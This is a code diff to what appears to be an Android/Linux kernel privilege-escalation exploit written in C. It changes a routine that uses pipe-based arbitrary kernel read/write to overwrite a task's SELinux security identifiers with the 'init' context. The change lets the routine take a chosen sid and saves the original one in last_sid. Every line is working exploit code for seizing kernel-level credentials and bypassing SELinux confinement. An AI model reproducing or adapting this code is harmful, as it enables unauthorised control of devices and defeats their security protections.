@@ -13,6 +13,8 @@
 #define TOSTR(str) QUOTE(str)
 #define ASMMAGIC (0xBEEFDEAD)
 
+static int last_sid;
+
 int read_at_address_pipe(void* address, void* buf, ssize_t len)
 {
 	int ret = 1;
@@ -58,7 +60,7 @@ inline int writel_at_address_pipe(void* address, unsigned long val)
 	return write_at_address_pipe(address, &val, sizeof(val));
 }
 
-int modify_task_cred_uc(struct thread_info* __kernel info)
+int modify_task_cred_uc_sid(struct thread_info* __kernel info, unsigned int sid)
 {
 	unsigned int i;
 	unsigned long val;
@@ -69,6 +71,8 @@ int modify_task_cred_uc(struct thread_info* __kernel info)
 
 	if(read_at_address_pipe(info, &ti, sizeof(ti)))
 		return 1;
+
+	last_sid = 0;
 
 	tsp = malloc(sizeof(*tsp));
 	for(i = 0; i < 0x600; i+= sizeof(void*))
@@ -125,9 +129,10 @@ int modify_task_cred_uc(struct thread_info* __kernel info)
 			&& tss.keycreate_sid == 0
 			&& tss.sockcreate_sid == 0)
 		{
-			unsigned int sid = get_sid("init");
 			if(sid)
 			{
+				read_at_address_pipe(&security->sid, &last_sid, sizeof(security->sid));
+
 				write_at_address_pipe(&security->osid, &sid, sizeof(security->osid));
 				write_at_address_pipe(&security->sid, &sid, sizeof(security->sid));
 			}
@@ -136,6 +141,16 @@ int modify_task_cred_uc(struct thread_info* __kernel info)
 
 end:
 	return 0;
+}
+
+unsigned get_last_sid(void)
+{
+	return last_sid;
+}
+
+int modify_task_cred_uc(struct thread_info* __kernel info)
+{
+	return modify_task_cred_uc_sid(info, get_sid("init"));
 }
 
 #if !(__LP64__)
